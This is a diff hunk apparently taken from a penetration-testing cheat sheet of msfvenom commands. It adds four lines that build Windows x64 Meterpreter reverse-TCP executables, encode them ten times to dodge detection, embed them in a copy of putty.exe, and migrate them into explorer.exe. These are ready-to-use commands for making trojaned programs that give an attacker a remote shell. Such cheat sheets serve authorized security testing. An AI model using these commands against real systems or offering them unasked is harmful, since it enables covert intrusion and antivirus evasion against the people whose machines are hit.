@@ -242,6 +242,10 @@ $ msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e php/bas
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
 $ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -b '\x00' -f exe    # -b is bad bytes
 $ msfvenom -p windows/meterpreter/reverse_http LHOST=<LHOST> LPORT=<LPORT> HttpUserAgent=<HEADER> -f exe -o <FILE>.exe
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
 ```
 
 ## Netcat Reverse Shell
